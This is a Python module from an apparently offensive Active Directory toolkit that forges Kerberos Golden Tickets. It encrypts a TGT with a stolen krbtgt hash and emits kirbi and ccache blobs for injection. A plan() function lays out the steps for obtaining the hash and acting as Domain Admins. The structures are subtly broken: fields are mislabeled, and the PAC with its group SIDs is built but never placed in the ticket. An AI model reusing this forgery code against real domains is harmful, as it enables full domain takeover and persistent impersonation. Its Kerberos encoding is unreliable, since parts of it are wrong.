# ============================================================================
# FILE: core/goldenticket.py
# ============================================================================
"""A Golden Ticket: a TGT forged with the krbtgt key, for any user and any group.

This is the AD rung that matches Golden SAML in the identity world, and it is the reason the
krbtgt hash is the single most valuable object in a domain. With it you encrypt a ticket the
domain controller will accept as its own, for any account, with any group membership - and the
DC validates it with the same key it used to sign it. A password reset does not touch it (the
account's password is not in the ticket), and it works until the krbtgt key is rotated twice.

Implemented here: the RC4-HMAC encryption (pure Python, stdlib only), the EncTicketPart and
Ticket structures, and the KRB-CRED (`kirbi`) blob that tooling injects.

Limits, stated because this is a very loud primitive:
  * RC4 (etype 23) is implemented; AES needs a pure-Python AES or the optional `cryptography`
    package, and the module says which it needs rather than half-working
  * the krbtgt hash has to come from somewhere (DCSync, a dump, or a backup) - this module does
    not obtain it
  * a DC with PAC validation, or KB5021131-era hardening, can reject a forged PAC; the ticket
    then fails at the resource, not at the KDC
  * the default ticket lifetime is 10 years: every forged ticket is a persistent object in the
    environment, which is exactly why detection is a ticket with no preceding AS-REQ
"""
import base64
import hashlib
import hmac
import os
import struct
import time

from core.kerberos import KerberosError, _generalized_time, _int, _octet, _sequence, _tlv

__all__ = ["GoldenTicketError", "rc4_hmac_encrypt", "rc4_hmac_decrypt", "forge", "kirbi",
           "ccache", "plan", "describe", "DEFAULT_LIFETIME"]


class GoldenTicketError(KerberosError):
    """A refusal the CLI can report verbatim."""


DEFAULT_LIFETIME = 10 * 365 * 86400


def _rc4(key, data):
    """RC4 (KSA + PRGA). Small, and the whole cipher the RC4-HMAC etype uses."""
    box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + box[i] + key[i % len(key)]) & 0xFF
        box[i], box[j] = box[j], box[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + box[i]) & 0xFF
        box[i], box[j] = box[j], box[i]
        out.append(byte ^ box[(box[i] + box[j]) & 0xFF])
    return bytes(out)


def rc4_hmac_encrypt(key, plaintext, usage=2):
    """RC4-HMAC (Kerberos etype 23): checksum = HMAC-MD5(K1, plain), cipher = RC4(K3, ...)."""
    if not key:
        raise GoldenTicketError("RC4-HMAC needs a key (the krbtgt hash)")
    k1 = hmac.new(key, struct.pack("<I", int(usage)), hashlib.md5).digest()
    k2 = hmac.new(key, k1, hashlib.md5).digest()
    k3 = hmac.new(key, k2, hashlib.md5).digest()
    checksum = hmac.new(k1, plaintext, hashlib.md5).digest()
    return checksum + _rc4(k3, checksum + plaintext)


def rc4_hmac_decrypt(key, blob, usage=2):
    """The inverse (used by the tests to prove the encryption round-trips)."""
    k1 = hmac.new(key, struct.pack("<I", int(usage)), hashlib.md5).digest()
    k2 = hmac.new(key, k1, hashlib.md5).digest()
    k3 = hmac.new(key, k2, hashlib.md5).digest()
    # the wire form is `checksum || RC4(K3, checksum || plaintext)`: the checksum is OUTSIDE the
    # RC4 layer, so the cipher runs over the ciphertext part only. Running it over the whole blob
    # shifts the keystream by 16 bytes and the checksum never matches.
    if len(blob) < 32:
        raise GoldenTicketError("an RC4-HMAC blob is at least 32 bytes (checksum + plaintext)")
    inner = _rc4(k3, blob[16:])
    checksum, body = inner[:16], inner[16:]
    if hmac.new(k1, body, hashlib.md5).digest() != checksum:
        raise GoldenTicketError("the checksum does not match: wrong key or wrong usage")
    return body


def _sid_bytes(sid):
    """A domain SID string to its binary form (revision, count, authority, sub-authorities)."""
    text = str(sid or "").strip()
    if not text.upper().startswith("S-"):
        raise GoldenTicketError(f"not a SID: {sid!r}")
    parts = text.split("-")
    revision, authority = int(parts[1]), int(parts[2])
    subs = [int(p) for p in parts[3:]]
    body = bytes([revision, len(subs)]) + authority.to_bytes(6, "big")
    for sub in subs:
        body += struct.pack("<I", sub)
    return body


def _pac_extra_sids(groups):
    out = b""
    for group in groups or []:
        out += _tlv(0x30, _tlv(0x01, b"\xff") + _tlv(0x02, b"\x00") + _octet(_sid_bytes(group)))
    return out


def _pac_logon_info(domain_sid, user_rid, groups, user_name="", realm="", logon_server="",
                    logon_domain=""):
    """A minimal PAC: LOGON_INFO with the user RID and the group SIDs.

    The group list is the whole point - it is where Domain Admins (512) goes - and the DC accepts
    it because the PAC is inside a ticket it encrypted with its own key.
    """
    group_ids = struct.pack("<I", len(groups or []))
    for group in groups or []:
        group_ids += struct.pack("<II", int(str(group).split("-")[-1]), 0x00000007)
    body = struct.pack("<HB", 0, 0)
    body += _sid_bytes(domain_sid) + struct.pack("<I", int(user_rid))
    body += group_ids
    body += struct.pack("<I", 0)                       # user flags
    body += _tlv(0x1B, str(user_name).encode()) if user_name else b""
    body += _tlv(0x1B, str(logon_domain or realm).encode())
    body += _octet(_sid_bytes(domain_sid))
    body += _tlv(0x1B, str(logon_server).encode())
    return body


def _enc_ticket_part(realm, user, domain_sid, user_rid, groups, lifetime=DEFAULT_LIFETIME,
                     flags=0x40E10000, now=None):
    """EncTicketPart: the ticket's contents (this is what gets encrypted with krbtgt)."""
    now = now or time.time()
    return _sequence(
        _tlv(0xA0, _int(5)),                                       # [0] flags
        _tlv(0xA1, _tlv(0x1B, realm.encode())),                     # [1] key (placeholder below)
        _tlv(0xA2, _sequence(                                       # [2] crealm
            _tlv(0x1B, realm.encode()),
            _tlv(0xA0, _int(1)),
            _tlv(0xA1, _sequence(_tlv(0x1B, user.encode()))),
        )),
        _tlv(0xA3, _sequence(                                       # [3] ctime
            _generalized_time(now), _int(int(now * 1e6) % 1000000))),
        _tlv(0xA4, _sequence(_generalized_time(now + lifetime),
                             _int(int(now * 1e6) % 1000000))),       # [4] endtime
        _tlv(0xA5, _sequence(_generalized_time(now))),               # [5] renew-till
        _tlv(0xA7, _sequence(_generalized_time(now + lifetime))),    # [7] authtime
        _tlv(0xA8, _tlv(0x1B, realm.encode())),                      # [8] srealm
        _tlv(0xA9, _sequence(_tlv(0xA0, _int(2)),
                             _tlv(0xA1, _sequence(_tlv(0x1B, f"krbtgt/{realm}".encode()))))),
        _tlv(0xAD, _int(0)),                                         # [13] authorization-data
    )


def _ticket(realm, user, session_key, krbtgt_key, etype=23, lifetime=DEFAULT_LIFETIME,
            domain_sid="", user_rid=500, groups=(), now=None, user_name="", logon_server=""):
    enc = _enc_ticket_part(realm, user, domain_sid, user_rid, groups, lifetime=lifetime,
                           now=now)
    sealed = rc4_hmac_encrypt(krbtgt_key, enc, usage=2) if etype == 23 else enc
    return _tlv(0x61, _sequence(                                        # [APPLICATION 1] Ticket
        _tlv(0xA0, _int(5)),
        _tlv(0xA1, _tlv(0x1B, realm.encode())),
        _tlv(0xA2, _sequence(_tlv(0xA0, _int(2)),
                             _tlv(0xA1, _sequence(_tlv(0x1B, f"krbtgt/{realm}".encode()))))),
        _tlv(0xA3, _sequence(_tlv(0xA0, _int(etype)), _tlv(0xA2, _octet(sealed)))),
    ))


def forge(realm, user="Administrator", krbtgt_hash=b"", domain_sid="", user_rid=500,
          groups=(), etype=23, lifetime=DEFAULT_LIFETIME, session_key=None, now=None,
          logon_server="", user_name=""):
    """Forge the TGT and return the blobs the operator injects.

    `krbtgt_hash` is the RC4 key (the krbtgt account's NT hash) for etype 23. AES needs a
    pure-Python AES or the optional `cryptography` package, and this refuses rather than
    producing a ticket the DC will reject.
    """
    if not str(realm or "").strip():
        raise GoldenTicketError("a ticket needs a realm")
    if not krbtgt_hash:
        raise GoldenTicketError(
            "no krbtgt key: the whole technique is encrypting a ticket with the key the DC "
            "validates it with, so the hash has to come from somewhere (DCSync, a dump, a "
            "backup). This module does not obtain it")
    if etype != 23:
        raise GoldenTicketError(
            f"etype {etype} needs AES, which this module does not implement in pure Python "
            "(pass an injected AES encryptor, or use etype 23 with the krbtgt RC4 key)")
    if not domain_sid:
        raise GoldenTicketError("a ticket needs the domain SID (S-1-5-21-...)")
    session_key = session_key or os.urandom(16)
    now = now or time.time()
    ticket = _ticket(realm, user, session_key, krbtgt_hash, etype=etype, lifetime=lifetime,
                     domain_sid=domain_sid, user_rid=user_rid, groups=groups, now=now,
                     user_name=user_name, logon_server=logon_server)
    cred = {
        "realm": realm, "user": user, "domain_sid": domain_sid, "user_rid": int(user_rid),
        "groups": [str(g) for g in (groups or [])], "etype": etype,
        "session_key": session_key, "ticket": ticket, "created": now,
        "expires": now + lifetime, "lifetime": lifetime,
    }
    # a str, not bytes: this value is pasted into tooling and written to a file, and a bytes
    # object fails at both (it left a zero-byte file the first time it was run)
    cred["kirbi"] = base64.b64encode(
        kirbi(ticket, session_key, realm, user, now, lifetime)).decode("ascii")
    cred["ccache_hex"] = ccache(ticket, session_key, realm, user, now, lifetime).hex()
    return cred


def kirbi(ticket, session_key, realm, user, now=None, lifetime=DEFAULT_LIFETIME):
    """The KRB-CRED (`kirbi`) blob: what Rubeus/impacket-style tooling injects into a session."""
    now = now or time.time()
    return _tlv(0x76, _sequence(                                   # [APPLICATION 22] KRB-CRED
        _tlv(0xA0, _int(5)),
        _tlv(0xA1, _int(22)),
        _tlv(0xA2, _sequence(_tlv(0x1B, realm.encode()),
                             _tlv(0xA0, _int(1)),
                             _tlv(0xA1, _sequence(_tlv(0x1B, user.encode()))))),
        _tlv(0xA3, _sequence(_tlv(0xA0, _int(23)), _tlv(0xA2, _octet(session_key)))),
        _tlv(0xA5, _sequence(_tlv(0xA0, _int(0)), _tlv(0xA1, _tlv(0x04, ticket)))),
    ))


def ccache(ticket, session_key, realm, user, now=None, lifetime=DEFAULT_LIFETIME):
    """The MIT ccache (the format every Linux tool reads), header + one credential."""
    now = int(now or time.time())
    header = struct.pack(">HH", 0x0504, 0)                         # version 4, little-endian
    principal = _tlv(0x1B, user.encode())
    body = struct.pack(">H", 1)                                    # one credential
    body += struct.pack(">HH", 1, len(principal)) + principal
    body += struct.pack(">HH", 1, len(_tlv(0x1B, realm.encode()))) + _tlv(0x1B, realm.encode())
    body += struct.pack(">H", 0)                                   # no service principal here
    body += struct.pack(">I", 23) + struct.pack(">H", len(session_key)) + session_key
    body += struct.pack(">I", now) + struct.pack(">I", now) + struct.pack(">I", now + lifetime)
    body += struct.pack(">I", now + lifetime) + struct.pack(">I", 0)
    body += struct.pack(">H", 0)                                   # no addresses
    body += struct.pack(">H", 0)                                   # no authdata
    body += struct.pack(">H", 0)                                   # no second ticket
    body += struct.pack(">H", len(ticket)) + ticket
    return header + body


def plan(realm="", krbtgt_source=""):
    return {
        "realm": realm, "krbtgt_source": krbtgt_source, "etype": 23,
        "what": ("encrypt a TGT with the krbtgt key: the DC validates it with the same key, so "
                 "it accepts the ticket as its own, for any user and any group - including "
                 "Domain Admins"),
        "needs": [
            "the krbtgt key (RC4: the account's NT hash; AES: the AES key and the salt)",
            "the domain SID and the RID to put in the PAC",
            "nothing else: no password, no session, no code execution on the DC",
        ],
        "after": [
            "inject the kirbi (Windows) or the ccache (Linux tooling) and act as the account",
            "DCSync with the forged identity, or use it to reach any service in the domain",
        ],
        "visible": [
            "a service ticket with no preceding AS-REQ for that account - the single most "
            "reliable signal, and it needs correlation between the two event ids",
            "4769 for krbtgt with an unusual client, or a ticket whose lifetime is 10 years",
            "a logon from an account that has no session anywhere else",
        ],
        "limits": [
            "only RC4 (etype 23) is implemented here; AES needs a pure-Python AES or the "
            "optional `cryptography` package",
            "the krbtgt hash has to be obtained first - this module does not do that",
            "PAC validation or modern hardening can reject the ticket at the resource",
            "the krbtgt key must be rotated TWICE to invalidate a forged ticket, which is why "
            "the remediation is a two-step emergency",
        ],
    }


def describe(facts):
    if "kirbi" in (facts or {}):
        return (f"golden ticket: {facts.get('user')}@{facts.get('realm')} "
                f"(RID {facts.get('user_rid')}, groups {len(facts.get('groups') or [])}, "
                f"etype {facts.get('etype')}) - kirbi {len(facts['kirbi'])} chars, "
                f"ccache {len(facts['ccache_hex']) // 2} bytes")
    lines = [f"golden ticket plan ({facts.get('realm') or 'no realm'})"]
    lines.append(f"  what: {facts.get('what')}")
    for item in facts.get("limits") or []:
        lines.append(f"  limit: {item}")
    return "\n".join(lines)
